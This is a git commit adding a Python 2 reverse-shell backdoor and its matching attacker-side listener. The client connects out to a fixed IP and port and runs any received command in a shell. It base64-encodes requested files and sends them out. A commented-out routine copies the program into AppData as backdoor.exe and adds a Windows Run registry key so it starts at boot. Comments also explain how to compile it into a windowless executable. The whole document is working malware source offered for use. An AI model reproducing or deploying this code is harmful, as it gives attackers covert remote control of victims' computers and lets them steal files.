8cc1f7d3a8bc2b2a323cf69e4d3253bf7902bc88
theantisocialextrovert <imrohan0124@gmail.com>
2020-05-02 12:24:46 -0400

    added download command

---
+++ reverse_shell.py
@@ -0,0 +1,84 @@
+#!/usr/bin/python
+#-----------------------------------------------------------------------------------------------------
+# rev_shell
+#-----------------------------------------------------------------------------------------------------
+import socket
+import subprocess
+import json
+import time
+import os
+import sys
+import shutil
+import base64
+class reverse_shell:
+    sock = None
+    #----------------------------------------------------------------------------------------------------------------------------------------------------
+    #copy_me: to copy the executable a different(safe location) & to store it in registry key dir, to run the backdoor whenever victim starts the machine 
+    #----------------------------------------------------------------------------------------------------------------------------------------------------   
+    def copy_me(self):
+        # use the following command(in cmd) for compiling the script to get .exe
+        # wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe reverse_shell.py --onefile --noconsole
+        location = os.environ["appdata"] + "\\backdoor.exe"
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell = True)
+
+    def reliable_recv(self):
+        recv_data = ""
+        while True:
+            try:
+                recv_data = self.sock.recv(1024)
+                return json.loads(recv_data)
+            except ValueError:
+                continue
+
+    def reliable_send(self, result):
+        self.sock.send(json.dumps(result))
+
+    def establish_connection(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        while True:
+            try:
+                self.sock.connect(("192.168.2.8",54321))
+                print "connetion established !"
+                return
+            except:
+                print "trying to reconnect ..."
+                time.sleep(5)
+                continue
+        
+    def run_rev_shell(self):
+        while True:
+            command = self.reliable_recv()
+            if command == "q" or command == "quit" or command == "exit":
+                break
+            elif len(command)>1 and command[:2] == "cd":
+                try:
+                    os.chdir(command[3:])
+                    self.reliable_send(os.getcwd())
+                except:
+                    self.reliable_send("error: no such directory")
+                    continue
+            elif len(command)>=8 and command[:8] == "download":
+                try:
+                    with open(command[9:],"rb") as file_for_upload:
+                        self.reliable_send(base64.b64encode(file_for_upload.read()))
+                except:
+                    print "error: no such file"
+            else:
+                try:
+                    process = subprocess.Popen(command , shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+                    result  = process.stdout.read() + process.stderr.read()
+                    self.reliable_send(result)
+                except:
+                    self.reliable_send("error: could not run the command!")
+                    continue
+    def close_conn(self):
+        self.sock.close()
+
+
+obj = reverse_shell()
+obj.establish_connection()
+#obj.copy_me()
+obj.run_rev_shell()
+obj.close_conn()
---
+++ the_server.py
@@ -0,0 +1,70 @@
+#!/usr/bin/python
+import socket
+import json
+import base64
+
+class reverse_shell_server:
+    target     = None
+    target_ip  = None
+    sever_sock = None 
+    
+    def reliable_send(self, data):
+        self.target.send(json.dumps(data))
+    
+    def reliable_recv(self):
+        recv_data = ""
+        while True:
+            try:
+                recv_data = recv_data + self.target.recv(1024)
+                return json.loads(recv_data)
+            except ValueError,TypeError:
+                continue
+
+    def establish_connection(self):
+        print "connecting to shell ... "
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind(("192.168.2.8", 54321))
+        sock.listen(5)
+        target,ip = sock.accept()
+        print "connection established starting shell ..."
+        self.target      = target
+        self.target_ip   = ip
+        self.server_sock = sock
+    
+    def load_rev_shell(self):
+        print "target = ",self.target, "ip = ",self.target_ip
+        
+        while True:
+            command = raw_input("reverse_shell:@{}~# ".format(self.target_ip))
+            #self.reliable_send(command)
+            if command == "q" or command == "quit" or command == "exit":
+                self.reliable_send(command)
+                break
+            elif len(command)>0 and command[:2] == "cd":
+                self.reliable_send(command)
+                print self.reliable_recv()
+            elif len(command)>=8 and command[:8] == "download":
+                file_list = command.split(" ")
+                if len(file_list)>1:
+                    for file_name in file_list[1:]:
+                        if not len(file_name) == 0:
+                            self.reliable_send("download "+file_name)
+                            with open(file_name, "wb") as downloaded_file:
+                                downloaded_file.write(base64.b64decode(self.reliable_recv()))
+                        else:
+                            print "error: no file name mentioned"
+                else:
+                    print "error: no file name mentioned"
+            else:
+                self.reliable_send(command)
+                output = self.reliable_recv()
+                print output
+    def close_conn(self):
+        self.server_sock.close()
+                
+obj = reverse_shell_server()
+obj.establish_connection()
+obj.load_rev_shell()
+obj.close_conn()
+
